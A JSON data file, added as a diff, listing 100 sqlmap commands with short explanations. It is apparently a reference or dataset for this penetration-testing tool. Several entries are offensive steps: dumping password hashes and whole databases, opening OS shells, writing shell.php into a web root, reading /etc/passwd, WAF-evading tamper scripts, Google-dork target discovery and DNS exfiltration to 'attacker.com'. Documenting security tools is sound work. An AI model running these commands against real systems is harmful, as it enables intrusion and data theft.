@@ -1,0 +1,707 @@
+{
+    "tool": "sqlmap",
+    "description": "Complete sqlmap command reference covering all options from basic to advanced",
+    "total_commands": 100,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic SQL Injection Detection",
+            "command": "sqlmap -u \"http://example.com/page.php?id=1\"",
+            "example": "sqlmap -u \"http://example.com/page.php?id=1\"",
+            "explanation": "Tests the specified URL parameter for basic SQL injection vulnerabilities."
+        },
+        {
+            "id": 2,
+            "category": "Basic SQL Injection Detection",
+            "command": "sqlmap -u \"http://example.com/page.php?id=1\" --batch",
+            "example": "sqlmap -u \"http://example.com/page.php?id=1\" --batch",
+            "explanation": "Runs sqlmap in non-interactive mode using default answers."
+        },
+        {
+            "id": 3,
+            "category": "Request File Injection",
+            "command": "sqlmap -r request.txt",
+            "example": "sqlmap -r request.txt",
+            "explanation": "Loads the HTTP request from a text file and tests all parameters."
+        },
+        {
+            "id": 4,
+            "category": "Direct Connection",
+            "command": "sqlmap -d \"mysql://user:password@192.168.1.1:3306/db_name\"",
+            "example": "sqlmap -d \"mysql://user:password@192.168.1.1:3306/db_name\"",
+            "explanation": "Connects directly to the database using credentials."
+        },
+        {
+            "id": 5,
+            "category": "Google Dorking",
+            "command": "sqlmap -g \"inurl:php?id=\"",
+            "example": "sqlmap -g \"inurl:php?id=\"",
+            "explanation": "Uses Google dorks to find potential targets automatically."
+        },
+        {
+            "id": 6,
+            "category": "POST Data Injection",
+            "command": "sqlmap -u \"http://example.com/login.php\" --data=\"user=admin&pass=123\"",
+            "example": "sqlmap -u \"http://example.com/login.php\" --data=\"user=admin&pass=123\"",
+            "explanation": "Tests POST data parameters for SQL injection."
+        },
+        {
+            "id": 7,
+            "category": "Cookie Injection",
+            "command": "sqlmap -u \"http://example.com/\" --cookie=\"PHPSESSID=123\"",
+            "example": "sqlmap -u \"http://example.com/\" --cookie=\"PHPSESSID=123\"",
+            "explanation": "Tests the Cookie header for SQL injection vulnerabilities."
+        },
+        {
+            "id": 8,
+            "category": "User-Agent Injection",
+            "command": "sqlmap -u \"http://example.com/\" --user-agent=\"SQLMAP\"",
+            "example": "sqlmap -u \"http://example.com/\" --user-agent=\"SQLMAP\"",
+            "explanation": "Sets a custom User-Agent header to test for header-based injection."
+        },
+        {
+            "id": 9,
+            "category": "Parameter Splitting",
+            "command": "sqlmap -u \"http://example.com/\" --param-del=\";\"",
+            "example": "sqlmap -u \"http://example.com/\" --param-del=\";\"",
+            "explanation": "Sets a custom character to split parameter values."
+        },
+        {
+            "id": 10,
+            "category": "Force DBMS",
+            "command": "sqlmap -u \"http://example.com/\" --dbms=\"MySQL\"",
+            "example": "sqlmap -u \"http://example.com/\" --dbms=\"MySQL\"",
+            "explanation": "Forces the backend DBMS to a specific type to speed up detection."
+        },
+        {
+            "id": 11,
+            "category": "Force OS",
+            "command": "sqlmap -u \"http://example.com/\" --os=\"Linux\"",
+            "example": "sqlmap -u \"http://example.com/\" --os=\"Linux\"",
+            "explanation": "Forces the backend operating system to a specific type."
+        },
+        {
+            "id": 12,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --banner",
+            "example": "sqlmap -u \"http://example.com/\" --banner",
+            "explanation": "Retrieves the database management system banner."
+        },
+        {
+            "id": 13,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --current-user",
+            "example": "sqlmap -u \"http://example.com/\" --current-user",
+            "explanation": "Retrieves the database user currently running the query."
+        },
+        {
+            "id": 14,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --current-db",
+            "example": "sqlmap -u \"http://example.com/\" --current-db",
+            "explanation": "Retrieves the name of the current database."
+        },
+        {
+            "id": 15,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --is-dba",
+            "example": "sqlmap -u \"http://example.com/\" --is-dba",
+            "explanation": "Checks if the current database user is a database administrator."
+        },
+        {
+            "id": 16,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --users",
+            "example": "sqlmap -u \"http://example.com/\" --users",
+            "explanation": "Enumerates all database users."
+        },
+        {
+            "id": 17,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --passwords",
+            "example": "sqlmap -u \"http://example.com/\" --passwords",
+            "explanation": "Enumerates database user password hashes."
+        },
+        {
+            "id": 18,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --privileges",
+            "example": "sqlmap -u \"http://example.com/\" --privileges",
+            "explanation": "Enumerates privileges for database users."
+        },
+        {
+            "id": 19,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --roles",
+            "example": "sqlmap -u \"http://example.com/\" --roles",
+            "explanation": "Enumerates roles for database users."
+        },
+        {
+            "id": 20,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --dbs",
+            "example": "sqlmap -u \"http://example.com/\" --dbs",
+            "explanation": "Enumerates all databases available on the server."
+        },
+        {
+            "id": 21,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb --tables",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb --tables",
+            "explanation": "Enumerates all tables within the specified database."
+        },
+        {
+            "id": 22,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb -T users --columns",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb -T users --columns",
+            "explanation": "Enumerates all columns within the specified table."
+        },
+        {
+            "id": 23,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump",
+            "explanation": "Dumps all data from the specified table."
+        },
+        {
+            "id": 24,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb -T users -C \"user,pass\" --dump",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb -T users -C \"user,pass\" --dump",
+            "explanation": "Dumps specific columns from the table."
+        },
+        {
+            "id": 25,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --dump-all",
+            "example": "sqlmap -u \"http://example.com/\" --dump-all",
+            "explanation": "Dumps the entire database content."
+        },
+        {
+            "id": 26,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --exclude-sysdbs",
+            "example": "sqlmap -u \"http://example.com/\" --exclude-sysdbs",
+            "explanation": "Excludes system databases when enumerating tables."
+        },
+        {
+            "id": 27,
+            "category": "Filtering",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump --start=1 --stop=10",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump --start=1 --stop=10",
+            "explanation": "Dumps only the first 10 rows from the table."
+        },
+        {
+            "id": 28,
+            "category": "Filtering",
+            "command": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump --where=\"id>5\"",
+            "example": "sqlmap -u \"http://example.com/\" -D testdb -T users --dump --where=\"id>5\"",
+            "explanation": "Dumps rows that match a specific condition."
+        },
+        {
+            "id": 29,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=B",
+            "example": "sqlmap -u \"http://example.com/\" --technique=B",
+            "explanation": "Restricts testing to Boolean-based blind injection only."
+        },
+        {
+            "id": 30,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=E",
+            "example": "sqlmap -u \"http://example.com/\" --technique=E",
+            "explanation": "Restricts testing to Error-based injection only."
+        },
+        {
+            "id": 31,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=U",
+            "example": "sqlmap -u \"http://example.com/\" --technique=U",
+            "explanation": "Restricts testing to Union-based injection only."
+        },
+        {
+            "id": 32,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=S",
+            "example": "sqlmap -u \"http://example.com/\" --technique=S",
+            "explanation": "Restricts testing to Stacked queries injection only."
+        },
+        {
+            "id": 33,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=T",
+            "example": "sqlmap -u \"http://example.com/\" --technique=T",
+            "explanation": "Restricts testing to Time-based blind injection only."
+        },
+        {
+            "id": 34,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --technique=Q",
+            "example": "sqlmap -u \"http://example.com/\" --technique=Q",
+            "explanation": "Restricts testing to Inline query injection only."
+        },
+        {
+            "id": 35,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --time-sec=10",
+            "example": "sqlmap -u \"http://example.com/\" --time-sec=10",
+            "explanation": "Sets the delay for time-based injection to 10 seconds."
+        },
+        {
+            "id": 36,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --union-cols=5",
+            "example": "sqlmap -u \"http://example.com/\" --union-cols=5",
+            "explanation": "Specifies the exact number of columns for UNION query testing."
+        },
+        {
+            "id": 37,
+            "category": "Advanced Injection Techniques",
+            "command": "sqlmap -u \"http://example.com/\" --union-char=\"1\"",
+            "example": "sqlmap -u \"http://example.com/\" --union-char=\"1\"",
+            "explanation": "Specifies the character to use for bruteforcing number of columns."
+        },
+        {
+            "id": 38,
+            "category": "Risk and Level",
+            "command": "sqlmap -u \"http://example.com/\" --level=3",
+            "example": "sqlmap -u \"http://example.com/\" --level=3",
+            "explanation": "Increases test level to check headers like Cookie and User-Agent."
+        },
+        {
+            "id": 39,
+            "category": "Risk and Level",
+            "command": "sqlmap -u \"http://example.com/\" --level=5",
+            "example": "sqlmap -u \"http://example.com/\" --level=5",
+            "explanation": "Sets maximum test level to check all headers and parameters."
+        },
+        {
+            "id": 40,
+            "category": "Risk and Level",
+            "command": "sqlmap -u \"http://example.com/\" --risk=3",
+            "example": "sqlmap -u \"http://example.com/\" --risk=3",
+            "explanation": "Increases risk level to include OR-based and heavy query tests."
+        },
+        {
+            "id": 41,
+            "category": "Performance",
+            "command": "sqlmap -u \"http://example.com/\" --threads=10",
+            "example": "sqlmap -u \"http://example.com/\" --threads=10",
+            "explanation": "Sets the maximum number of concurrent HTTP requests."
+        },
+        {
+            "id": 42,
+            "category": "Performance",
+            "command": "sqlmap -u \"http://example.com/\" --null-connection",
+            "example": "sqlmap -u \"http://example.com/\" --null-connection",
+            "explanation": "Retrieves page length without body to save bandwidth."
+        },
+        {
+            "id": 43,
+            "category": "Performance",
+            "command": "sqlmap -u \"http://example.com/\" --keep-alive",
+            "example": "sqlmap -u \"http://example.com/\" --keep-alive",
+            "explanation": "Uses persistent HTTP(s) connections."
+        },
+        {
+            "id": 44,
+            "category": "Performance",
+            "command": "sqlmap -u \"http://example.com/\" --predict-output",
+            "example": "sqlmap -u \"http://example.com/\" --predict-output",
+            "explanation": "Predicts common output values to reduce requests."
+        },
+        {
+            "id": 45,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --tamper=\"space2comment\"",
+            "example": "sqlmap -u \"http://example.com/\" --tamper=\"space2comment\"",
+            "explanation": "Replaces spaces with comments to bypass WAF filters."
+        },
+        {
+            "id": 46,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --tamper=\"between\"",
+            "example": "sqlmap -u \"http://example.com/\" --tamper=\"between\"",
+            "explanation": "Replaces greater/less than operators with SQL BETWEEN clause."
+        },
+        {
+            "id": 47,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --tamper=\"charencode\"",
+            "example": "sqlmap -u \"http://example.com/\" --tamper=\"charencode\"",
+            "explanation": "URL-encodes all characters in the payload."
+        },
+        {
+            "id": 48,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --tamper=\"charunicodeencode\"",
+            "example": "sqlmap -u \"http://example.com/\" --tamper=\"charunicodeencode\"",
+            "explanation": "Unicode-encodes non-standard characters."
+        },
+        {
+            "id": 49,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --skip-waf",
+            "example": "sqlmap -u \"http://example.com/\" --skip-waf",
+            "explanation": "Skips heuristic WAF detection checks."
+        },
+        {
+            "id": 50,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --random-agent",
+            "example": "sqlmap -u \"http://example.com/\" --random-agent",
+            "explanation": "Uses a randomly selected User-Agent for each session."
+        },
+        {
+            "id": 51,
+            "category": "WAF Evasion",
+            "command": "sqlmap -u \"http://example.com/\" --delay=2",
+            "example": "sqlmap -u \"http://example.com/\" --delay=2",
+            "explanation": "Adds a delay between each HTTP request to avoid rate limiting."
+        },
+        {
+            "id": 52,
+            "category": "Authentication",
+            "command": "sqlmap -u \"http://example.com/\" --auth-type=Basic --auth-cred=\"admin:admin\"",
+            "example": "sqlmap -u \"http://example.com/\" --auth-type=Basic --auth-cred=\"admin:admin\"",
+            "explanation": "Uses Basic HTTP authentication."
+        },
+        {
+            "id": 53,
+            "category": "Authentication",
+            "command": "sqlmap -u \"http://example.com/\" --auth-file=\"auth.pem\"",
+            "example": "sqlmap -u \"http://example.com/\" --auth-file=\"auth.pem\"",
+            "explanation": "Uses a client certificate file for authentication."
+        },
+        {
+            "id": 54,
+            "category": "Network Configuration",
+            "command": "sqlmap -u \"http://example.com/\" --proxy=\"http://127.0.0.1:8080\"",
+            "example": "sqlmap -u \"http://example.com/\" --proxy=\"http://127.0.0.1:8080\"",
+            "explanation": "Routes traffic through a specified HTTP proxy."
+        },
+        {
+            "id": 55,
+            "category": "Network Configuration",
+            "command": "sqlmap -u \"http://example.com/\" --tor",
+            "example": "sqlmap -u \"http://example.com/\" --tor",
+            "explanation": "Routes traffic through the Tor anonymity network."
+        },
+        {
+            "id": 56,
+            "category": "Network Configuration",
+            "command": "sqlmap -u \"http://example.com/\" --tor-type=SOCKS5",
+            "example": "sqlmap -u \"http://example.com/\" --tor-type=SOCKS5",
+            "explanation": "Specifies the Tor proxy type as SOCKS5."
+        },
+        {
+            "id": 57,
+            "category": "Network Configuration",
+            "command": "sqlmap -u \"http://example.com/\" --check-tor",
+            "example": "sqlmap -u \"http://example.com/\" --check-tor",
+            "explanation": "Checks if the Tor connection is working properly."
+        },
+        {
+            "id": 58,
+            "category": "Network Configuration",
+            "command": "sqlmap -u \"http://example.com/\" --force-ssl",
+            "example": "sqlmap -u \"http://example.com/\" --force-ssl",
+            "explanation": "Forces usage of SSL/HTTPS."
+        },
+        {
+            "id": 59,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --os-cmd=whoami",
+            "example": "sqlmap -u \"http://example.com/\" --os-cmd=whoami",
+            "explanation": "Executes a single operating system command."
+        },
+        {
+            "id": 60,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --os-shell",
+            "example": "sqlmap -u \"http://example.com/\" --os-shell",
+            "explanation": "Prompts for an interactive operating system shell."
+        },
+        {
+            "id": 61,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --os-pwn",
+            "example": "sqlmap -u \"http://example.com/\" --os-pwn",
+            "explanation": "Prompts for an out-of-band shell via Meterpreter or VNC."
+        },
+        {
+            "id": 62,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --os-smb",
+            "example": "sqlmap -u \"http://example.com/\" --os-smb",
+            "explanation": "One-click prompt for an OOB shell, Meterpreter or VNC via SMB."
+        },
+        {
+            "id": 63,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --os-bof",
+            "example": "sqlmap -u \"http://example.com/\" --os-bof",
+            "explanation": "Attempts to exploit stored procedure buffer overflows."
+        },
+        {
+            "id": 64,
+            "category": "OS Interaction",
+            "command": "sqlmap -u \"http://example.com/\" --priv-esc",
+            "example": "sqlmap -u \"http://example.com/\" --priv-esc",
+            "explanation": "Attempts to escalate database process privileges."
+        },
+        {
+            "id": 65,
+            "category": "File System Access",
+            "command": "sqlmap -u \"http://example.com/\" --file-read=\"/etc/passwd\"",
+            "example": "sqlmap -u \"http://example.com/\" --file-read=\"/etc/passwd\"",
+            "explanation": "Reads a file from the database server file system."
+        },
+        {
+            "id": 66,
+            "category": "File System Access",
+            "command": "sqlmap -u \"http://example.com/\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"",
+            "example": "sqlmap -u \"http://example.com/\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\"",
+            "explanation": "Uploads a local file to the database server file system."
+        },
+        {
+            "id": 67,
+            "category": "Advanced Access",
+            "command": "sqlmap -u \"http://example.com/\" --sql-shell",
+            "example": "sqlmap -u \"http://example.com/\" --sql-shell",
+            "explanation": "Provides an interactive SQL prompt."
+        },
+        {
+            "id": 68,
+            "category": "Advanced Access",
+            "command": "sqlmap -u \"http://example.com/\" --sql-query=\"SELECT version()\"",
+            "example": "sqlmap -u \"http://example.com/\" --sql-query=\"SELECT version()\"",
+            "explanation": "Executes a single arbitrary SQL query."
+        },
+        {
+            "id": 69,
+            "category": "Advanced Access",
+            "command": "sqlmap -u \"http://example.com/\" --reg-read",
+            "example": "sqlmap -u \"http://example.com/\" --reg-read",
+            "explanation": "Reads a Windows registry key value."
+        },
+        {
+            "id": 70,
+            "category": "Advanced Access",
+            "command": "sqlmap -u \"http://example.com/\" --reg-add",
+            "example": "sqlmap -u \"http://example.com/\" --reg-add",
+            "explanation": "Writes a Windows registry key value data."
+        },
+        {
+            "id": 71,
+            "category": "Advanced Access",
+            "command": "sqlmap -u \"http://example.com/\" --reg-del",
+            "example": "sqlmap -u \"http://example.com/\" --reg-del",
+            "explanation": "Deletes a Windows registry key value."
+        },
+        {
+            "id": 72,
+            "category": "Data Exfiltration",
+            "command": "sqlmap -u \"http://example.com/\" --dns-domain=\"attacker.com\"",
+            "example": "sqlmap -u \"http://example.com/\" --dns-domain=\"attacker.com\"",
+            "explanation": "Uses DNS exfiltration for data retrieval."
+        },
+        {
+            "id": 73,
+            "category": "General Options",
+            "command": "sqlmap -u \"http://example.com/\" -v 3",
+            "example": "sqlmap -u \"http://example.com/\" -v 3",
+            "explanation": "Sets verbosity level to show payloads."
+        },
+        {
+            "id": 74,
+            "category": "General Options",
+            "command": "sqlmap -u \"http://example.com/\" -v 6",
+            "example": "sqlmap -u \"http://example.com/\" -v 6",
+            "explanation": "Sets verbosity level to trace all HTTP traffic."
+        },
+        {
+            "id": 75,
+            "category": "General Options",
+            "command": "sqlmap -u \"http://example.com/\" --flush-session",
+            "example": "sqlmap -u \"http://example.com/\" --flush-session",
+            "explanation": "Flushes the session file to start fresh."
+        },
+        {
+            "id": 76,
+            "category": "General Options",
+            "command": "sqlmap -u \"http://example.com/\" --fresh-queries",
+            "example": "sqlmap -u \"http://example.com/\" --fresh-queries",
+            "explanation": "Ignores query results stored in the session file."
+        },
+        {
+            "id": 77,
+            "category": "General Options",
+            "command": "sqlmap -u \"http://example.com/\" --save=config.ini",
+            "example": "sqlmap -u \"http://example.com/\" --save=config.ini",
+            "explanation": "Saves the current configuration to an INI file."
+        },
+        {
+            "id": 78,
+            "category": "General Options",
+            "command": "sqlmap -c config.ini",
+            "example": "sqlmap -c config.ini",
+            "explanation": "Loads options from a configuration INI file."
+        },
+        {
+            "id": 79,
+            "category": "General Options",
+            "command": "sqlmap --update",
+            "example": "sqlmap --update",
+            "explanation": "Updates sqlmap to the latest version."
+        },
+        {
+            "id": 80,
+            "category": "General Options",
+            "command": "sqlmap --purge",
+            "example": "sqlmap --purge",
+            "explanation": "Safely removes all content from the sqlmap data directory."
+        },
+        {
+            "id": 81,
+            "category": "General Options",
+            "command": "sqlmap --dependencies",
+            "example": "sqlmap --dependencies",
+            "explanation": "Checks for missing third-party dependencies."
+        },
+        {
+            "id": 82,
+            "category": "Output Control",
+            "command": "sqlmap -u \"http://example.com/\" --batch --results-file=results.csv",
+            "example": "sqlmap -u \"http://example.com/\" --batch --results-file=results.csv",
+            "explanation": "Saves results to a CSV file."
+        },
+        {
+            "id": 83,
+            "category": "Output Control",
+            "command": "sqlmap -u \"http://example.com/\" --dump-format=HTML",
+            "example": "sqlmap -u \"http://example.com/\" --dump-format=HTML",
+            "explanation": "Dumps data in HTML format."
+        },
+        {
+            "id": 84,
+            "category": "Output Control",
+            "command": "sqlmap -u \"http://example.com/\" --dump-format=SQLITE",
+            "example": "sqlmap -u \"http://example.com/\" --dump-format=SQLITE",
+            "explanation": "Dumps data into a SQLite database file."
+        },
+        {
+            "id": 85,
+            "category": "Advanced Tuning",
+            "command": "sqlmap -u \"http://example.com/\" --hpp",
+            "example": "sqlmap -u \"http://example.com/\" --hpp",
+            "explanation": "Uses HTTP parameter pollution method."
+        },
+        {
+            "id": 86,
+            "category": "Advanced Tuning",
+            "command": "sqlmap -u \"http://example.com/\" --skip-urlencode",
+            "example": "sqlmap -u \"http://example.com/\" --skip-urlencode",
+            "explanation": "Skips URL encoding of payload data."
+        },
+        {
+            "id": 87,
+            "category": "Advanced Tuning",
+            "command": "sqlmap -u \"http://example.com/\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\"",
+            "example": "sqlmap -u \"http://example.com/\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\"",
+            "explanation": "Evaluates Python code before the request."
+        },
+        {
+            "id": 88,
+            "category": "Advanced Tuning",
+            "command": "sqlmap -u \"http://example.com/\" --scope=\"example.com\"",
+            "example": "sqlmap -u \"http://example.com/\" --scope=\"example.com\"",
+            "explanation": "Regulates targets based on a regex scope."
+        },
+        {
+            "id": 89,
+            "category": "Advanced Tuning",
+            "command": "sqlmap -m targets.txt",
+            "example": "sqlmap -m targets.txt",
+            "explanation": "Scans multiple targets listed in a text file."
+        },
+        {
+            "id": 90,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --count",
+            "example": "sqlmap -u \"http://example.com/\" --count",
+            "explanation": "Retrieves the number of entries for tables."
+        },
+        {
+            "id": 91,
+            "category": "Enumeration",
+            "command": "sqlmap -u \"http://example.com/\" --schema",
+            "example": "sqlmap -u \"http://example.com/\" --schema",
+            "explanation": "Enumerates the database schema."
+        },
+        {
+            "id": 92,
+            "category": "Brute Force",
+            "command": "sqlmap -u \"http://example.com/\" --common-tables",
+            "example": "sqlmap -u \"http://example.com/\" --common-tables",
+            "explanation": "Checks for existence of common tables using a wordlist."
+        },
+        {
+            "id": 93,
+            "category": "Brute Force",
+            "command": "sqlmap -u \"http://example.com/\" --common-columns",
+            "example": "sqlmap -u \"http://example.com/\" --common-columns",
+            "explanation": "Checks for existence of common columns using a wordlist."
+        },
+        {
+            "id": 94,
+            "category": "Brute Force",
+            "command": "sqlmap -u \"http://example.com/\" --common-files",
+            "example": "sqlmap -u \"http://example.com/\" --common-files",
+            "explanation": "Checks for existence of common files on the file system."
+        },
+        {
+            "id": 95,
+            "category": "Injection Point",
+            "command": "sqlmap -u \"http://example.com/item/1*\"",
+            "example": "sqlmap -u \"http://example.com/item/1*\"",
+            "explanation": "Uses the asterisk to manually mark the injection point."
+        },
+        {
+            "id": 96,
+            "category": "Injection Point",
+            "command": "sqlmap -u \"http://example.com/\" --skip=\"user-agent\"",
+            "example": "sqlmap -u \"http://example.com/\" --skip=\"user-agent\"",
+            "explanation": "Skips testing of the specified parameter."
+        },
+        {
+            "id": 97,
+            "category": "Injection Point",
+            "command": "sqlmap -u \"http://example.com/\" --param-exclude=\"token\"",
+            "example": "sqlmap -u \"http://example.com/\" --param-exclude=\"token\"",
+            "explanation": "Excludes parameters from testing based on regex."
+        },
+        {
+            "id": 98,
+            "category": "Crawling",
+            "command": "sqlmap -u \"http://example.com/\" --crawl=2",
+            "example": "sqlmap -u \"http://example.com/\" --crawl=2",
+            "explanation": "Crawls the website to a depth of 2 to find targets."
+        },
+        {
+            "id": 99,
+            "category": "Crawling",
+            "command": "sqlmap -u \"http://example.com/\" --crawl-exclude=\"logout\"",
+            "example": "sqlmap -u \"http://example.com/\" --crawl-exclude=\"logout\"",
+            "explanation": "Excludes specific pages from crawling based on regex."
+        },
+        {
+            "id": 100,
+            "category": "Cleanup",
+            "command": "sqlmap -u \"http://example.com/\" --cleanup",
+            "example": "sqlmap -u \"http://example.com/\" --cleanup",
+            "explanation": "Removes tables or functions created by sqlmap."
+        }
+    ]
+}
